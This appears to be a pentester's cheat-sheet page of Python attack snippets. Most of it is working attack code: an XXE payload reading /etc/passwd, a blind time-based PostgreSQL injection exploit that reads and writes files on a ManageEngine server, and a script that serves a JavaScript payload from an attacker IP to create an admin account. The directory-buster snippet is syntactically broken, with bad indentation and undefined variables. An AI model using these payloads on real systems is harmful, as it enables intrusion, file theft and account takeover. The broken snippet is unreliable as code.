# Python Code Block

## HTTP Proxy + Simple Request

{% code overflow="wrap" %}
```python
import requests, sys

# -----Disable SSL warning-----
requests.packages.urllib3.disable_warnings()


# -----PROXY-----
session = requests.Session()
session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

session.verify = False

# -----GET Request Example-----
response = session.get("https://example.com")
print(response.text)


# -----POST Request Example-----
data = {
    "parameter": "value"
}

response = session.post("https://example.com/api", data=data)
# JSON: response = session.post("https://example.com/api", json=data)
print(response.status_code)
print(response.text)
```
{% endcode %}

## XML Data Request

{% code overflow="wrap" %}
```python
import requests

# -----Config-----
PROXY = "http://127.0.0.1:8080"

# -----Session setup-----
session = requests.Session()
session.proxies = {"http": PROXY, "https": PROXY}
session.verify = False
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

url = "http://example.com/api"

headers = {
    "Content-Type": "application/xml",   # tell server this is XML
}

xml_data = """<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<bugreport>
		<title>&xxe;</title>
		<cwe>something</cwe>
	</bugreport>
"""

response = session.post(url, headers=headers, data=xml_data)

print("Status:", response.status_code)
print("Response:", response.text)
```
{% endcode %}

## Directory Buster w/ Diff Methods

{% code overflow="wrap" %}
```python
import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='Target URL: https://example.com', required=True)
parser.add_argument('-w','--wordlist', help='Wordlist to use')
parser.add_argument('-b','--blacklist', help='Status code to exclude: 401,404,500', default="404")
parser.add_argument('-m','--method', help='HTTP method: GET,POST,PUT', default="GET")
args = parser.parse_args()

# -----Config-----
PROXY = "http://127.0.0.1:8080"

# -----Session setup-----
session = requests.Session()
#session.proxies = {"http": PROXY, "https": PROXY}
#header = {"Authorization":"Bearer token"}
session.verify = False
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

blacklist = (args.blacklist).split(',')  
methods = (args.method).split(',')    

for method in methods:
    print(f"URL                - \t{method}")
    with open(args.wordlist, "r") as f:
    for word in f:
        url = "{target}/{word}".format(target=args.target, word=word.strip())
            r_method = session.request(method.upper(), url=url, headers=header).status_code

            if(r_method not in [args.blacklist] or r_post not in [args.blacklist]):
                print("{target}/{word} - \t{pmethod}\r\n".format(target=args.target, word=word.strip(), pmethod=r_method)
    print("===============================")

print('\r', end='')
print("Wordlist completed.")
```
{% endcode %}

## PostgreSQL

{% code overflow="wrap" %}
```python
import requests
import sys

# -----Config-----
PROXY = "http://127.0.0.1:8080"
BASE_URL = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1"
SLEEP_TIMER = 5
TIMEOUT = 25
THRESHOLD = 1.5  # Margin to account for network variance

# -----Session setup-----
session = requests.Session()
session.proxies = {"http": PROXY, "https": PROXY}
session.verify = False
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# -----Helpers-----
def send_payload(payload: str) -> float:
    """Send request with SQL payload and return response time in seconds."""
    try:
        full_url = BASE_URL + payload
        response = session.get(full_url, timeout=TIMEOUT)
        return response.elapsed.total_seconds()
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return 0

def is_timed_response(elapsed: float, expected: int = SLEEP_TIMER) -> bool:
    return expected <= elapsed < expected + THRESHOLD

# -----Attack Steps-----
def test_sql_injection():
    print("[*] Testing sleep-based SQLi...")
    payload = f";SELECT+pg_sleep({SLEEP_TIMER});--"
    elapsed = send_payload(payload)
    print(f"[+] Response time: {elapsed:.2f} seconds")
    return is_timed_response(elapsed)

def check_superuser():
    print("[*] Testing for superuser access...")
    payload = f";SELECT+CASE+WHEN+(SELECT+current_setting($$is_superuser$$))=$$on$$+THEN+pg_sleep({SLEEP_TIMER})+END;--"
    elapsed = send_payload(payload)
    print(f"[+] Response time: {elapsed:.2f} seconds")
    return is_timed_response(elapsed)

def read_file(path: str):
    print(f"[*] Attempting to read file: {path}")
    length = detect_length(path) or 30
    print(f"[*] Attempting to extract first {length} characters of the file...")
    ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789./_-:$@{}()[]!#%&= "
    extracted = ""

    for position in range(1, length + 1):
        found = False
        for ch in ALPHABET:
            ascii_val = ord(ch)
            payload = (
                f";+DROP+TABLE+IF+EXISTS+pwned;+CREATE+TEMP+TABLE+pwned+(content+TEXT);+"
                f"COPY+pwned+FROM+$$" + path + "$$;+"
                f"SELECT+CASE+WHEN+(ascii(substr((SELECT+content+FROM+pwned),{position},1))={ascii_val})+THEN+pg_sleep({SLEEP_TIMER})+END;--"
            )

            elapsed = send_payload(payload)
            if is_timed_response(elapsed):
                extracted += ch
                print(f"[+] Char {position}: '{ch}' (elapsed: {elapsed:.2f}s)")
                found = True
                break
        if not found:
            print(f"[-] Char {position}: not found")
            extracted += "?"
    print(f"\n[+] Extracted content: {extracted}")

def write_file(path: str, content: str):
    print(f"[*] Attempting to write to: {path}")
    payload = f";COPY (SELECT $$" + content + "$$) TO $$" + path + "$$;--"
    elapsed = send_payload(payload)
    print("[-] Command sent. Please confirm output with Read File function.")

def detect_length(path, max_len=100):
    print(f"[*] Determining content length (max {max_len})...")
    for length in range(1, max_len + 1):
        payload = (
            f";+DROP+TABLE+IF+EXISTS+pwned;+CREATE+TEMP+TABLE+pwned+(content+TEXT);+"
            f"COPY+pwned+FROM+$$" + path + "$$;+"
            f"SELECT+CASE+WHEN+(LENGTH((SELECT+content+FROM+pwned))={length}) "
            f"THEN+pg_sleep({SLEEP_TIMER})+END;--"
        )
        elapsed = send_payload(payload)
        if is_timed_response(elapsed):
            print(f"[+] Detected length: {length}")
            return length
    print("[-] Failed to determine length.")
    return None

# -----Main Menu-----
def main():
    if not test_sql_injection():
        print("[-] Initial SQLi test failed.")
        return

    if check_superuser():
        print("[+] Superuser access confirmed!")
    else:
        print("[-] Not a superuser or check failed.")

    while True:
        print("\n=== Actions ===")
        print("[1] Read file")
        print("[2] Write to file")
        print("[3] Attempt RCE (TODO)")
        print("[4] Quit")
        choice = input("Select an option: ").strip()

        if choice == "1":
            path = input("Enter full file path to read: ").strip()
            if path:
                read_file(path)
        elif choice == "2":
            path = input("Enter full file path to write to: ").strip()
            content = input("Enter content to write: ").strip()
            if path and content:
                write_file(path, content)
        elif choice == "3":
            print("[!] RCE functionality not yet implemented.")
        elif choice == "4":
            print("Exiting.")
            sys.exit()
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
```
{% endcode %}

## JavaScript

Host JS in a webserver and wait for calls:

```python
import tempfile, argparse, os
from http.server import HTTPServer, SimpleHTTPRequestHandler

parser = argparse.ArgumentParser()
#parser.add_argument('-t','--target', help='Victim IP', required=True)
parser.add_argument('-l','--lhost', help='Attacker IP (tun0)', required=True)
parser.add_argument('-lp','--lport', help='Attacker port', default=8000)
args = parser.parse_args()
lhost = args.lhost
lport = args.lport

def send_JS_payload():
    # Create a temporary directory
    with tempfile.TemporaryDirectory() as tmpdir:
        filename = "payload.js"
        filepath = os.path.join(tmpdir, filename)
        js_data = f"""async function createUser() {{
            const post_url = 'http://{lhost}:{lport}/admin/users/create';
            const data = new URLSearchParams({{
                name: 'santaa',
                email: 'santaa@email.add',
                isAdmin: 'true',
                isMod: 'true'
            }});

            try {{
                const response = await fetch(post_url, {{
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {{
                        'Content-Type': 'application/x-www-form-urlencoded',
                    }},
                    body: data.toString(),
                }});
                const result = await response.text();
            }} catch (error) {{
                console.error('Error:', error);
            }}
        }}

        createUser();
        """

        # Write content to temp file
        with open(filepath, "w") as f:
            f.write(js_data)
        print(f"[+] Temp file created at {filepath}")

        # Serve that directory
        os.chdir(tmpdir)
        server = HTTPServer((lhost, lport), SimpleHTTPRequestHandler)
        print(f"[*] Serving {filename} at http://{lhost}:{lport}/{filename}")
        print("[*] Waiting for request...")
        server.handle_request()
        print("[*] Server stopped, temp file cleaned up")

send_JS_payload()
```
